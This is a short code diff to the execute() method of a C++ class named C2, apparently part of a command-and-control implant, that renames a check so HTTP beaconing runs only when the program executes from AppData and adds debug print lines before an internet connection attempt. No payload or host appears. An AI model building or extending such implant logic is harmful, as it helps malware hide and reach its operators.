@@ -26,10 +26,12 @@ void C2::cleanup() {
 
 void C2::execute() {
 	
-	if (!this->util.isInAppData()) {
+	if (!this->util.isExecutingFromAppData()) {
+		printf("Not sending HTTP... \n");
 		return;
 	}
 
+	printf("Sending HTTP... \n");
 	this->response = ""; // reset response
 
 	this->error = InternetAttemptConnect(0);
